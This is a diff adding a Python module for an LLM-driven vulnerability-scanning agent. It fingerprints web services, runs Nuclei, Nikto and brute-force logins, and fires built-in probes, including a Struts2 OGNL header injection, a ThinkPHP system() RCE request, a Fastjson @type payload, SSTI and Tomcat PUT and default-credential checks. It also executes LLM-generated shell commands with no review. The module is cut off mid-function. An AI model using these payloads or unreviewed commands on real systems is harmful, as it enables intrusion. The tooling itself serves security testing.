@@ -1,0 +1,1065 @@
+"""
+vuln_agent.py
+漏洞扫描 Agent —— LLM 驱动扫描策略
+
+流程：
+  1. whatweb/httpx + 主动 JSON 探测 做指纹识别
+  2. LLM 分析指纹 → 动态生成 Nuclei 标签和扫描策略
+  3. 按端口并发、端口内串行 Nuclei 扫描
+  4. Nikto 补充 + Hydra 弱口令
+  5. LLM 主动漏洞发现（工具扫不到时兜底）
+"""
+from __future__ import annotations
+
+import asyncio
+import json
+import logging
+from typing import Any
+
+from backend.agents.models import PortInfo, VulnFinding
+from backend.knowledge.exploit_kb import ExploitKB, ExploitEntry
+from backend.tools.executor import ToolExecutor, ExecuteResult
+from backend.tools.parsers.nuclei_parser import NucleiParser
+from backend.tools.parsers.nikto_parser import NiktoParser
+from backend.llm.router import LLMRouter
+
+logger = logging.getLogger(__name__)
+
+BRUTE_SERVICES = {
+    21:    ("ftp",      ["anonymous", "admin", "ftp"]),
+    22:    ("ssh",      ["root", "admin", "ubuntu"]),
+    23:    ("telnet",   ["admin", "root"]),
+    3306:  ("mysql",    ["root", "admin"]),
+    5432:  ("postgres", ["postgres", "admin"]),
+    6379:  ("redis",    [""]),
+    27017: ("mongodb",  ["admin"]),
+    445:   ("smb",      ["administrator", "admin", "guest"]),
+    3389:  ("rdp",      ["administrator", "admin"]),
+}
+
+
+class VulnAgent:
+    def __init__(self):
+        self.executor = ToolExecutor()
+        self.nuclei_parser = NucleiParser()
+        self.nikto_parser = NiktoParser()
+        self.llm = LLMRouter()
+        self.kb = ExploitKB()
+
+    async def run(
+        self,
+        target: str,
+        ports: list[PortInfo],
+        web_paths: list[str],
+        target_os: str = "unknown",
+        task_id: Optional[str] = None,
+    ) -> dict[str, Any]:
+        logger.info(f"[VulnAgent] 开始漏洞扫描: {target}")
+
+        web_ports = [
+            p for p in ports
+            if p.service in ("http", "https", "opsmessaging")
+            or p.port in (80, 443, 8080, 8081, 8090, 8443, 8888, 9000, 9090, 9200)
+        ]
+
+        all_findings: list[VulnFinding] = []
+
+        # ── Phase 1: 指纹识别（各端口并发）───────────────
+        fingerprints: dict[int, dict] = {}
+        fp_tasks = []
+        for wp in web_ports:
+            scheme = "https" if wp.port in (443, 8443) else "http"
+            web_url = f"{scheme}://{target}:{wp.port}"
+            fp_tasks.append(self._fingerprint(web_url, wp))
+
+        fp_results = await asyncio.gather(*fp_tasks, return_exceptions=True)
+        for wp, fp_result in zip(web_ports, fp_results):
+            if isinstance(fp_result, Exception):
+                logger.warning(f"[VulnAgent] 指纹识别异常 :{wp.port}: {fp_result}")
+                fingerprints[wp.port] = {"url": f"http://{target}:{wp.port}", "summary": "unknown"}
+            else:
+                fingerprints[wp.port] = fp_result
+                logger.info(f"[VulnAgent] 指纹 :{wp.port} -> {fp_result.get('summary', 'unknown')}")
+
+        # ── Phase 2: LLM 分析指纹 → 扫描策略 ────────────
+        scan_strategy = await self._llm_scan_strategy(target, target_os, ports, web_ports, fingerprints, web_paths)
+        logger.info(f"[VulnAgent] LLM 扫描策略: {json.dumps(scan_strategy, ensure_ascii=False)[:300]}")
+
+        # ── Phase 3: 按端口并发，端口内串行扫描 ──────────
+        async def _scan_one_port(wp: PortInfo) -> list[VulnFinding]:
+            scheme = "https" if wp.port in (443, 8443) else "http"
+            web_url = f"{scheme}://{target}:{wp.port}"
+            port_findings: list[VulnFinding] = []
+
+            # 3a: LLM 推荐标签专扫（最精准，优先跑）
+            llm_tags = scan_strategy.get("nuclei_tags", [])
+            if llm_tags:
+                r = await self._nuclei_tag_scan(web_url, target, llm_tags)
+                port_findings.extend(r.get("findings", []))
+
+            # 3b: 基础 CVE + 漏洞 + 配置错误扫描
+            r = await self._nuclei_broad_scan(web_url, target)
+            port_findings.extend(r.get("findings", []))
+
+            # 3c: 对 Gobuster 发现的路径做深入扫描
+            if web_paths:
+                r = await self._nuclei_path_scan(web_url, target, web_paths)
+                port_findings.extend(r.get("findings", []))
+
+            # 3d: Nikto 补充
+            r = await self._nikto_scan(web_url)
+            port_findings.extend(r.get("findings", []))
+
+            return port_findings
+
+        port_tasks = [_scan_one_port(wp) for wp in web_ports]
+        port_tasks.append(self._brute_force_scan_wrapper(target, ports))
+
+        scan_results = await asyncio.gather(*port_tasks, return_exceptions=True)
+        for r in scan_results:
+            if isinstance(r, Exception):
+                logger.warning(f"[VulnAgent] 端口扫描异常: {r}")
+            elif isinstance(r, list):
+                all_findings.extend(r)
+
+        # ── Phase 3.5: 知识库驱动精准检测 ────────────────
+        # 用指纹信息查知识库，用知识库里的具体检测命令验证漏洞
+        kb_findings = await self._kb_driven_detection(
+            target, target_os, ports, fingerprints, web_paths, all_findings
+        )
+        all_findings.extend(kb_findings)
+
+        # ── Phase 4: LLM 主动漏洞发现（工具扫不到时兜底）──
+        exploitable_count = sum(1 for f in all_findings if f.exploitable)
+        has_high = any(f.severity in ("critical", "high") for f in all_findings)
+        if exploitable_count == 0 or not has_high:
+            logger.info("[VulnAgent] 工具发现不足，启动 LLM 主动漏洞分析...")
+            llm_findings = await self._llm_active_discovery(
+                target, target_os, ports, fingerprints, web_paths, all_findings
+            )
+            all_findings.extend(llm_findings)
+
+        all_findings = _deduplicate(all_findings)
+        logger.info(f"[VulnAgent] 扫描完成，共 {len(all_findings)} 个发现")
+
+        return {"findings": all_findings, "raw_nuclei": "", "raw_nikto": ""}
+
+    # ================================================================
+    # Phase 1: 指纹识别
+    # ================================================================
+
+    async def _fingerprint(self, web_url: str, port_info: PortInfo) -> dict:
+        """用 whatweb + httpx + 主动 JSON 探测做指纹识别"""
+        fp = {
+            "url": web_url,
+            "port": port_info.port,
+            "nmap_service": port_info.service,
+            "nmap_version": port_info.version,
+            "nmap_banner": port_info.banner,
+            "whatweb": "",
+            "httpx": "",
+            "json_probe": "",
+            "summary": "",
+        }
+
+        # whatweb
+        whatweb_result: ExecuteResult = await self.executor.run(
+            tool="whatweb",
+            args=["--color=never", "-a", "3", web_url],
+            timeout=30,
+        )
+        if whatweb_result.success and whatweb_result.stdout:
+            fp["whatweb"] = whatweb_result.stdout.strip()[:2000]
+
+        # httpx
+        httpx_result: ExecuteResult = await self.executor.run(
+            tool="httpx",
+            args=[
+                "-u", web_url,
+                "-title", "-tech-detect", "-status-code",
+                "-server", "-content-type",
+                "-follow-redirects",
+                "-silent",
+            ],
+            timeout=20,
+        )
+        if httpx_result.success and httpx_result.stdout:
+            fp["httpx"] = httpx_result.stdout.strip()[:1000]
+
+        # 基础关键词匹配
+        combined = f"{fp['whatweb']} {fp['httpx']} {port_info.version} {port_info.banner}".lower()
+        techs = []
+        tech_keywords = {
+            "thinkphp": "ThinkPHP", "laravel": "Laravel", "django": "Django",
+            "flask": "Flask", "spring": "Spring", "struts": "Struts",
+            "tomcat": "Tomcat", "nginx": "Nginx", "apache": "Apache",
+            "iis": "IIS", "weblogic": "WebLogic", "jboss": "JBoss",
+            "wordpress": "WordPress", "drupal": "Drupal", "joomla": "Joomla",
+            "shiro": "Shiro", "fastjson": "Fastjson", "jackson": "Jackson",
+            "vue": "Vue.js", "react": "React", "angular": "Angular",
+            "php": "PHP", "java": "Java", "python": "Python", "node": "Node.js",
+            "redis": "Redis", "mysql": "MySQL", "postgres": "PostgreSQL",
+            "mongodb": "MongoDB", "elasticsearch": "Elasticsearch",
+            "activemq": "ActiveMQ", "rabbitmq": "RabbitMQ",
+            "geoserver": "GeoServer", "gitlab": "GitLab", "jenkins": "Jenkins",
+            "grafana": "Grafana", "nacos": "Nacos", "xxl-job": "XXL-JOB",
+            "solr": "Solr", "confluence": "Confluence", "exchange": "Exchange",
+        }
+        for kw, name in tech_keywords.items():
+            if kw in combined:
+                techs.append(name)
+
+        # ── 主动 JSON 探测（检测 fastjson/jackson/spring 等）──
+        # 探测1: 发畸形 @type 看响应状态码
+        json_probe_status: ExecuteResult = await self.executor.run(
+            tool="curl",
+            args=[
+                "-s", "-X", "POST",
+                "-H", "Content-Type: application/json",
+                "-d", '{"@type":"java.lang.AutoCloseable"',
+                "-o", "/dev/null", "-w", "%{http_code}",
+                "--max-time", "5",
+                web_url,
+            ],
+            timeout=10,
+        )
+
+        # 探测2: 发 @type payload 看报错内容
+        json_probe_body: ExecuteResult = await self.executor.run(
+            tool="curl",
+            args=[
+                "-s", "-X", "POST",
+                "-H", "Content-Type: application/json",
+                "-d", '{"a":{"@type":"java.net.Inet4Address","val":"127.0.0.1"}}',
+                "--max-time", "5",
+                web_url,
+            ],
+            timeout=10,
+        )
+
+        # 探测3: 发正常 JSON 看是否接受
+        json_probe_normal: ExecuteResult = await self.executor.run(
+            tool="curl",
+            args=[
+                "-s", "-X", "POST",
+                "-H", "Content-Type: application/json",
+                "-d", '{"test": 1}',
+                "--max-time", "5",
+                "-w", "\n%{http_code}",
+                web_url,
+            ],
+            timeout=10,
+        )
+
+        probe_output = f"{json_probe_body.stdout} {json_probe_body.stderr}".lower()
+        normal_output = json_probe_normal.stdout.lower()
+
+        if "fastjson" in probe_output or "com.alibaba.fastjson" in probe_output:
+            if "Fastjson" not in techs:
+                techs.append("Fastjson")
+            if "Java" not in techs:
+                techs.append("Java")
+            fp["json_probe"] = f"FASTJSON_DETECTED: {json_probe_body.stdout[:500]}"
+        elif "jackson" in probe_output or "com.fasterxml.jackson" in probe_output:
+            if "Jackson" not in techs:
+                techs.append("Jackson")
+            if "Java" not in techs:
+                techs.append("Java")
+            fp["json_probe"] = f"JACKSON_DETECTED: {json_probe_body.stdout[:500]}"
+        elif "springframework" in probe_output or "spring" in probe_output:
+            if "Spring" not in techs:
+                techs.append("Spring")
+            if "Java" not in techs:
+                techs.append("Java")
+            fp["json_probe"] = f"SPRING_DETECTED: {json_probe_body.stdout[:500]}"
+        elif json_probe_status.success and json_probe_status.stdout.strip() in ("400", "500", "415"):
+            # 后端解析了 JSON 请求，可能是 Java 框架
+            fp["json_probe"] = f"JSON_ENDPOINT: status={json_probe_status.stdout.strip()}, body={json_probe_body.stdout[:300]}"
+            if "application/json" in normal_output and "Java" not in techs:
+                techs.append("Java")
+
+        fp["summary"] = ", ".join(techs) if techs else "unknown"
+        return fp
+
+    # ================================================================
+    # Phase 2: LLM 驱动扫描策略
+    # ================================================================
+
+    async def _llm_scan_strategy(
+        self,
+        target: str,
+        target_os: str,
+        ports: list[PortInfo],
+        web_ports: list[PortInfo],
+        fingerprints: dict[int, dict],
+        web_paths: list[str],
+    ) -> dict:
+        from backend.llm.prompts.templates import VULN_SCAN_STRATEGY
+
+        fp_summary = {}
+        for port, fp in fingerprints.items():
+            fp_summary[port] = {
+                "url": fp.get("url", ""),
+                "whatweb": fp.get("whatweb", "")[:500],
+                "httpx": fp.get("httpx", "")[:300],
+                "json_probe": fp.get("json_probe", ""),
+                "detected_tech": fp.get("summary", ""),
+                "nmap_version": fp.get("nmap_version", ""),
+            }
+
+        ports_info = [{"port": p.port, "service": p.service, "version": p.version[:60]} for p in ports[:20]]
+
+        prompt = VULN_SCAN_STRATEGY.format(
+            target=target,
+            target_os=target_os,
+            ports_json=json.dumps(ports_info, ensure_ascii=False),
+            fingerprints_json=json.dumps(fp_summary, ensure_ascii=False, indent=2),
+            web_paths_json=json.dumps(web_paths[:30], ensure_ascii=False),
+        )
+
+        try:
+            result = await self.llm.chat(prompt, response_format="json")
+            strategy = json.loads(result)
+            if "error" in strategy or not strategy.get("nuclei_tags"):
+                raise ValueError(f"LLM 返回无效策略: {strategy.get('error', 'empty tags')}")
+            return {
+                "nuclei_tags": strategy.get("nuclei_tags", []),
+                "analysis": strategy.get("analysis", ""),
+                "high_value_targets": strategy.get("high_value_targets", []),
+            }
+        except Exception as e:
+            logger.warning(f"[VulnAgent] LLM 扫描策略失败，根据指纹生成回退策略: {e}")
+            # 从指纹自动生成标签
+            fallback_tags = set()
+            for port, fp in fingerprints.items():
+                summary = fp.get("summary", "").lower()
+                tag_map = {"thinkphp": ["thinkphp", "php"], "fastjson": ["fastjson", "java"], "tomcat": ["tomcat", "default-login"], "spring": ["spring", "java"], "shiro": ["shiro", "java"], "weblogic": ["weblogic", "java"], "wordpress": ["wordpress"], "jenkins": ["jenkins"], "jboss": ["jboss", "java"], "struts": ["struts", "java"], "laravel": ["laravel", "php"], "django": ["django", "python"], "flask": ["flask", "python"], "nacos": ["nacos"], }
+                for kw, tags in tag_map.items():
+                    if kw in summary:
+                        fallback_tags.update(tags)
+            return {"nuclei_tags": list(fallback_tags)[:8], "analysis": f"LLM 不可用，根据指纹自动回退: {list(fallback_tags)}", }
+
+    # ================================================================
+    # Phase 3: Nuclei 扫描
+    # ================================================================
+
+    async def _nuclei_broad_scan(self, web_url: str, target: str) -> dict:
+        """基础扫描：CVE + 漏洞 + 配置错误"""
+        result: ExecuteResult = await self.executor.run(
+            tool="nuclei",
+            args=[
+                "-u", web_url,
+                "-t", "http/cves/",
+                "-t", "http/vulnerabilities/",
+                "-t", "http/misconfiguration/",
+                "-severity", "critical,high,medium",
+                "-jsonl",
+                "-silent",
+                "-rate-limit", "150",
+                "-timeout", "10",
+                "-retries", "1",
+                "-c", "25",
+            ],
+            timeout=600,
+        )
+
+        findings: list[VulnFinding] = []
+        if result.success and result.stdout:
+            findings = self.nuclei_parser.parse(result.stdout, target)
+
+        return {"findings": findings, "raw_nuclei": result.stdout}
+
+    async def _nuclei_tag_scan(self, web_url: str, target: str, tags: list[str]) -> dict:
+        """LLM 推荐标签的专项扫描"""
+        if not tags:
+            return {"findings": []}
+
+        tag_str = ",".join(tags[:8])
+        logger.info(f"[VulnAgent] LLM 推荐标签扫描: {tag_str} @ {web_url}")
+
+        result: ExecuteResult = await self.executor.run(
+            tool="nuclei",
+            args=[
+                "-u", web_url,
+                "-tags", tag_str,
+                "-jsonl",
+                "-silent",
+                "-timeout", "10",
+                "-retries", "1",
+                "-c", "25",
+            ],
+            timeout=600,
+        )
+
+        findings: list[VulnFinding] = []
+        if result.success and result.stdout:
+            findings = self.nuclei_parser.parse(result.stdout, target)
+
+        return {"findings": findings}
+
+    async def _nuclei_path_scan(self, web_url: str, target: str, paths: list[str]) -> dict:
+        """对 Gobuster 发现的路径做深入扫描"""
+        if not paths:
+            return {"findings": []}
+
+        urls = []
+        for path in paths[:20]:
+            url = f"{web_url}{path}" if path.startswith("/") else f"{web_url}/{path}"
+            urls.append(url)
+
+        url_list = "\n".join(urls)
+        logger.info(f"[VulnAgent] 路径深扫: {len(urls)} 条路径 @ {web_url}")
+
+        result: ExecuteResult = await self.executor.run(
+            tool="nuclei",
+            args=[
+                "-l", "/dev/stdin",
+                "-t", "http/cves/",
+                "-t", "http/vulnerabilities/",
+                "-t", "http/misconfiguration/",
+                "-t", "http/exposures/",
+                "-severity", "critical,high,medium,low",
+                "-jsonl",
+                "-silent",
+                "-timeout", "10",
+                "-retries", "1",
+                "-c", "25",
+            ],
+            input_data=url_list,
+            timeout=300,
+        )
+
+        findings: list[VulnFinding] = []
+        if result.success and result.stdout:
+            findings = self.nuclei_parser.parse(result.stdout, target)
+
+        return {"findings": findings}
+
+    # ================================================================
+    # Phase 3.5: 知识库驱动精准检测
+    # ================================================================
+
+    async def _kb_driven_detection(
+        self,
+        target: str,
+        target_os: str,
+        ports: list[PortInfo],
+        fingerprints: dict[int, dict],
+        web_paths: list[str],
+        existing_findings: list[VulnFinding],
+    ) -> list[VulnFinding]:
+        """
+        用知识库里的检测方法精准验证漏洞。
+
+        流程：
+          1. 收集所有信号（指纹关键词、端口、JSON探测结果、服务名）
+          2. 多维度查知识库
+          3. 对每个匹配的KB条目，执行其 detection_method / verification_command
+          4. 确认存在的漏洞标记 exploitable=True
+        """
+        if self.kb.size == 0:
+            logger.info("[VulnAgent] 知识库为空，跳过 KB 检测")
+            return []
+
+        # ── 收集搜索信号 ──────────────────────────────
+        search_signals = set()
+        all_fp_text = ""
+
+        for port, fp in fingerprints.items():
+            summary = fp.get("summary", "")
+            for tech in summary.split(", "):
+                tech = tech.strip()
+                if tech and tech != "unknown":
+                    search_signals.add(tech)
+
+            # JSON 探测结果也是重要信号
+            json_probe = fp.get("json_probe", "")
+            if json_probe:
+                search_signals.add("json")
+                if "FASTJSON" in json_probe.upper():
+                    search_signals.add("fastjson")
+                if "JACKSON" in json_probe.upper():
+                    search_signals.add("jackson")
+                if "SPRING" in json_probe.upper():
+                    search_signals.add("spring")
+                # 关键：即使没有明确检测到 fastjson 字样，
+                # 只要是 Java + JSON endpoint，也应该尝试 fastjson 检测
+                if "JSON_ENDPOINT" in json_probe:
+                    search_signals.add("fastjson")
+                    search_signals.add("java")
+
+            all_fp_text += f" {summary} {json_probe} "
+
+            # 从 whatweb/httpx 原始输出提取更多信号
+            whatweb = fp.get("whatweb", "").lower()
+            httpx_out = fp.get("httpx", "").lower()
+            nmap_ver = fp.get("nmap_version", "").lower()
+            nmap_banner = fp.get("nmap_banner", "").lower()
+            combined_fp = f"{whatweb} {httpx_out} {nmap_ver} {nmap_banner} {summary}".lower()
+
+            # 直接关键词提取
+            fp_keywords = {
+                "tomcat": ["tomcat"], "struts": ["struts"], "jboss": ["jboss"],
+                "weblogic": ["weblogic"], "shiro": ["shiro", "rememberme", "deleteme"],
+                "activemq": ["activemq"], "flask": ["flask", "werkzeug"],
+                "django": ["django"], "thinkphp": ["thinkphp"],
+                "geoserver": ["geoserver"], "wordpress": ["wordpress", "wp-"],
+                "jenkins": ["jenkins"], "spring": ["spring", "springframework"],
+                "fastjson": ["fastjson", "alibaba"], "php": ["php/"],
+                "nginx": ["nginx"], "apache": ["apache"],
+                "gunicorn": ["gunicorn"], "jinja2": ["jinja2"],
+            }
+            for signal_name, keywords in fp_keywords.items():
+                for kw in keywords:
+                    if kw in combined_fp:
+                        search_signals.add(signal_name)
+                        break
+
+        # 从端口服务名提取信号
+        for p in ports:
+            svc = f"{p.service} {p.version} {p.banner}".lower()
+            for kw in ["tomcat", "struts", "jboss", "weblogic", "shiro",
+                        "activemq", "flask", "django", "thinkphp", "geoserver",
+                        "wordpress", "jenkins", "nginx", "php", "java",
+                        "gunicorn", "werkzeug", "python", "apache"]:
+                if kw in svc:
+                    search_signals.add(kw)
+
+        # ── Web 框架推理规则 ─────────────────────────
+        # 根据已有信号推断可能的框架和漏洞类型
+        inference_rules = {
+            # Python Web 服务器 → 可能是 Flask/Django，搜索 SSTI
+            ("python",):     ["flask", "django", "ssti"],
+            ("gunicorn",):   ["flask", "django", "ssti", "python"],
+            ("werkzeug",):   ["flask", "ssti", "python"],
+            ("wsgiserver",): ["flask", "django", "ssti", "python"],
+            # Java 服务器 → 搜索常见 Java 漏洞
+            ("java",):       ["fastjson", "shiro", "struts", "spring"],
+            ("tomcat",):     ["tomcat", "java", "shiro", "struts"],
+            # PHP → ThinkPHP 等
+            ("php",):        ["thinkphp", "wordpress"],
+            # Shiro 相关
+            ("rememberme",): ["shiro"],
+            ("deleteme",):   ["shiro"],
+        }
+
+        signals_to_add = set()
+        for trigger_signals, inferred in inference_rules.items():
+            if any(s.lower() in {x.lower() for x in search_signals} for s in trigger_signals):
+                signals_to_add.update(inferred)
+        search_signals.update(signals_to_add)
+
+        # 已发现的漏洞名也是信号
+        existing_names = {f.name.lower() for f in existing_findings}
+        existing_cves = {f.cve.lower() for f in existing_findings if f.cve}
+
+        # 从已发现的漏洞中提取额外信号
+        for name in existing_names:
+            for kw in ["shiro", "flask", "django", "fastjson", "struts",
+                        "tomcat", "ssti", "spring", "jboss", "weblogic"]:
+                if kw in name:
+                    search_signals.add(kw)
+
+        logger.info(f"[VulnAgent] KB 搜索信号: {search_signals}")
+
+        # ── 多维度搜索知识库 ──────────────────────────
+        matched_entries: dict[str, ExploitEntry] = {}
+        for signal in search_signals:
+            results = self.kb.search(vuln_name=signal, fingerprint=signal)
+            for entry in results:
+                if entry.vuln_id not in matched_entries:
+                    matched_entries[entry.vuln_id] = entry
+
+        if not matched_entries:
+            logger.info("[VulnAgent] KB 未匹配到任何条目")
+            return []
+
+        logger.info(
+            f"[VulnAgent] KB 匹配到 {len(matched_entries)} 个条目: "
+            f"{list(matched_entries.keys())}"
+        )
+
+        # ── 对每个匹配条目执行检测 ────────────────────
+        findings: list[VulnFinding] = []
+
+        for entry in matched_entries.values():
+            # 跳过已经发现过的
+            entry_cves_lower = {c.lower() for c in entry.match_cves}
+            if entry_cves_lower & existing_cves:
+                logger.debug(f"[VulnAgent] KB 跳过已发现: {entry.vuln_id}")
+                continue
+
+            # 确定目标 URL
+            port = entry.default_port or 80
+            # 看哪个指纹端口最匹配
+            for fp_port in fingerprints:
+                if fp_port == entry.default_port:
+                    port = fp_port
+                    break
+            # 如果KB默认端口不在开放端口中，用第一个web端口
+            open_ports = {p.port for p in ports}
+            if port not in open_ports:
+                for fp_port in fingerprints:
+                    port = fp_port
+                    break
+
+            scheme = "https" if port in (443, 8443) else "http"
+            target_url = f"{scheme}://{target}:{port}"
+
+            logger.info(f"[VulnAgent] KB 检测: {entry.vuln_id} @ {target_url}")
+
+            # 执行验证命令
+            verified = await self._run_kb_detection(entry, target_url, target)
+
+            if verified:
+                logger.info(f"[VulnAgent] ✅ KB 确认漏洞: {entry.description}")
+                findings.append(VulnFinding(
+                    name=entry.description,
+                    severity="high" if not entry.requires_callback else "medium",
+                    cve=entry.match_cves[0] if entry.match_cves else None,
+                    target=target_url,
+                    port=port,
+                    description=f"[KB验证] {entry.detection_method[:200]}",
+                    evidence=verified,
+                    exploitable=True,
+                    tool="kb-detection",
+                ))
+            else:
+                logger.info(f"[VulnAgent] ❌ KB 未确认: {entry.vuln_id}")
+
+        logger.info(f"[VulnAgent] KB 驱动检测完成: {len(findings)} 个确认漏洞")
+        return findings
+
+    async def _run_kb_detection(
+        self,
+        entry: ExploitEntry,
+        target_url: str,
+        target_ip: str,
+    ) -> str:
+        """
+        执行知识库条目中的检测命令，返回成功证据（空字符串=未确认）。
+
+        只用 verification_command + 内置探测，不用 exploit_steps（那是利用步骤）。
+        """
+        success_sign = entry.verification_success_sign.lower() if entry.verification_success_sign else ""
+
+        # 收集检测命令
+        commands_to_try: list[tuple[str, str]] = []
+
+        # 1. 用 verification_command
+        if entry.verification_command:
+            cmd = self._replace_target(entry.verification_command, target_url, target_ip)
+            commands_to_try.append((cmd, "verification_command"))
+
+        # 2. 根据漏洞类型生成内置检测探针（不依赖 LLM 生成的 KB 内容）
+        builtin = self._builtin_detection_probes(entry, target_url)
+        commands_to_try.extend(builtin)
+
+        # 3. 都没有就让 LLM 生成
+        if not commands_to_try:
+            if entry.detection_method:
+                return await self._run_kb_detection_via_llm(entry, target_url, target_ip)
+            return ""
+
+        # 依次尝试
+        for cmd, source in commands_to_try:
+            logger.info(f"[VulnAgent] KB 执行 [{source}]: {cmd[:120]}...")
+
+            result: ExecuteResult = await self.executor.run_script(
+                script_content=cmd,
+                timeout=15,
+            )
+
+            stdout = result.stdout.strip()
+            stderr = result.stderr.strip()
+            combined = f"{stdout} {stderr}".lower()
+
+            if not stdout and not stderr:
+                continue
+
+            # 检查成功标志
+            confirmed = False
+
+            if success_sign and success_sign in combined:
+                confirmed = True
+            elif any(sign in combined for sign in [
+                "uid=", "root:", "www-data", "tomcat:",
+                "fastjson", "com.alibaba.fastjson",
+                "com.sun.rowset", "@type", "autotype",
+                "type not match", "typemismatch",
+                "struts", "ognl", "opensymphony",
+                "ssti", "jinja2",
+                "rememberme=deleteme", "rememberme=delete",
+                "hello 49",      # SSTI: {{7*7}} = 49
+                "command execution",
+                "programmingerror",  # Django SQL error
+                "django.db",
+            ]):
+                confirmed = True
+            elif result.exit_code == 0 and len(stdout) > 10:
+                confirmed = await self._llm_quick_verify(
+                    entry.description, cmd, stdout[:2000], stderr[:500]
+                )
+
+            if confirmed:
+                evidence = f"命令: {cmd[:200]}\n输出: {stdout[:3000]}"
+                return evidence
+
+        return ""
+
+    @staticmethod
+    def _replace_target(cmd: str, target_url: str, target_ip: str) -> str:
+        """
+        智能替换命令中的 {TARGET} 占位符，避免 http://http://... 双重拼接。
+
+        KB 中的命令格式不统一，可能是:
+          - curl http://{TARGET}:8090/     → {TARGET} 应替换为纯 IP
+          - curl {TARGET}/path             → {TARGET} 应替换为完整 URL
+          - /opt/script.sh {TARGET}        → {TARGET} 应替换为完整 URL
+        """
+        if "{TARGET}" not in cmd:
+            return cmd
+
+        # 检测命令中 {TARGET} 前面是否已有 http:// 或 https://
+        has_scheme = "http://{TARGET}" in cmd or "https://{TARGET}" in cmd
+
+        if has_scheme:
+            # 命令里已经有协议头，{TARGET} 只替换为 IP(:port)
+            # 从 target_url 提取 host:port
+            from urllib.parse import urlparse
+            parsed = urlparse(target_url)
+            host_port = parsed.netloc or target_ip  # "47.109.151.41:8090"
+            cmd = cmd.replace("{TARGET}", host_port)
+        else:
+            # 命令里没有协议头，{TARGET} 替换为完整 URL
+            cmd = cmd.replace("{TARGET}", target_url)
+
+        # 兜底清理
+        cmd = cmd.replace("your-ip", target_ip).replace("your_ip", target_ip)
+        return cmd
+
+    @staticmethod
+    def _builtin_detection_probes(
+        entry: ExploitEntry, target_url: str
+    ) -> list[tuple[str, str]]:
+        """
+        根据漏洞类型生成内置检测探针。
+
+        这些探针不依赖 LLM 提取质量，是确定性的检测方法。
+        """
+        probes: list[tuple[str, str]] = []
+        keywords = " ".join(entry.match_keywords + entry.tags).lower()
+        category = entry.category.lower()
+
+        # ── Fastjson 检测 ──────────────────────────────
+        if "fastjson" in keywords or "fastjson" in category:
+            probes.append((
+                f'curl -s -X POST {target_url} '
+                f'-H "Content-Type: application/json" '
+                f'''-d '{{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"}}' '''
+                f'--max-time 10',
+                "builtin_fastjson_detect"
+            ))
+            probes.append((
+                f'curl -s -X POST {target_url} '
+                f'-H "Content-Type: application/json" '
+                f'''-d '{{"@type":"java.net.Inet4Address","val":"127.0.0.1"}}' '''
+                f'--max-time 10',
+                "builtin_fastjson_inet"
+            ))
+
+        # ── Struts2 检测 ──────────────────────────────
+        if "struts" in keywords or "s2-045" in keywords:
+            probes.append((
+                f'curl -s -I {target_url} '
+                f'''-H "Content-Type: %{{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Struts-Test','S2-045-OK')}}.multipart/form-data" '''
+                f'--max-time 10',
+                "builtin_s2045_detect"
+            ))
+
+        # ── Shiro 检测 ──────────────────────────────
+        if "shiro" in keywords:
+            # 发一个带错误 rememberMe cookie 的请求，看响应头是否有 deleteMe
+            probes.append((
+                f'curl -s -D - -o /dev/null {target_url} '
+                f'-H "Cookie: rememberMe=invalid_token" --max-time 10',
+                "builtin_shiro_detect"
+            ))
+
+        # ── Flask SSTI 检测 ──────────────────────────
+        if "ssti" in keywords or "flask" in keywords or "jinja2" in keywords:
+            # 用 --data-urlencode 避免花括号被 shell 解释
+            probes.append((
+                f'curl -s -G --data-urlencode "name={{{{7*7}}}}" {target_url} --max-time 10',
+                "builtin_ssti_detect"
+            ))
+
+        # ── Django 检测 ──────────────────────────────
+        if "django" in keywords:
+            # 触发 Django debug 页面
+            probes.append((
+                f'curl -s {target_url}/nonexistent_path_for_debug --max-time 10',
+                "builtin_django_detect"
+            ))
+
+        # ── ThinkPHP 检测 ──────────────────────────
+        if "thinkphp" in keywords:
+            probes.append((
+                f'curl -s -d "_method=__construct&filter[]=system&method=get'
+                f'&server[REQUEST_METHOD]=echo%20THINKPHP_RCE_OK" '
+                f'"{target_url}/index.php?s=captcha" --max-time 10',
+                "builtin_thinkphp_detect"
+            ))
+
+        # ── Tomcat PUT 检测 ──────────────────────────
+        if "tomcat" in keywords and ("put" in keywords or "12615" in keywords):
+            probes.append((
+                f'curl -s -X PUT {target_url}/test_put_check.txt '
+                f'-d "put_test_ok" -o /dev/null -w "%{{http_code}}" --max-time 10',
+                "builtin_tomcat_put_detect"
+            ))
+
+        # ── Tomcat 弱口令 检测 ────────────────────────
+        if "tomcat" in keywords and ("weak" in keywords or "弱口令" in keywords or "password" in keywords):
+            probes.append((
+                f'curl -s -u tomcat:tomcat {target_url}/manager/text/list --max-time 10',
+                "builtin_tomcat_weak_detect"
+            ))
+
+        return probes
+
+    async def _run_kb_detection_via_llm(
+        self,
+        entry: ExploitEntry,
+        target_url: str,
+        target_ip: str,
+    ) -> str:
+        """当KB条目没有具体命令但有detection_method描述时，让LLM生成检测命令"""
+        prompt = (
+            f"你是渗透测试工程师。根据以下检测方法，生成一条具体可执行的curl命令来验证漏洞是否存在。\n\n"
+            f"漏洞: {entry.description}\n"
+            f"检测方法: {entry.detection_method}\n"
+            f"目标URL: {target_url}\n"
+            f"常见端点: {', '.join(entry.common_endpoints[:5])}\n\n"
+            f"只返回一条完整的curl命令，不要任何解释。"
+        )
+        try:
+            cmd = await self.llm.chat(prompt, temperature=0.1, max_tokens=500)
+            cmd = cmd.strip().strip('`').strip()
+            if not cmd.startswith("curl"):
+                return ""
+
+            result: ExecuteResult = await self.executor.run_script(cmd, timeout=30)
+            if result.stdout.strip():
+                verified = await self._llm_quick_verify(
+                    entry.description, cmd, result.stdout[:2000], result.stderr[:500]
+                )
+                if verified:
+                    return f"命令: {cmd[:200]}\n输出: {result.stdout[:3000]}"
+        except Exception as e:
+            logger.warning(f"[VulnAgent] KB LLM检测失败: {e}")
+
+        return ""
+
+    async def _llm_quick_verify(
+        self, vuln_name: str, command: str, stdout: str, stderr: str
+    ) -> bool:
+        """让LLM快速判断命令输出是否确认漏洞存在"""
+        prompt = (
+            f"判断以下命令输出是否确认漏洞 [{vuln_name}] 存在。\n\n"
+            f"命令: {command[:200]}\n"
+            f"stdout:\n{stdout[:1500]}\n\n"
+            f"stderr:\n{stderr[:300]}\n\n"
+            f"只返回JSON: {{\"confirmed\": true/false, \"reason\": \"简要原因\"}}"
+        )
+        try:
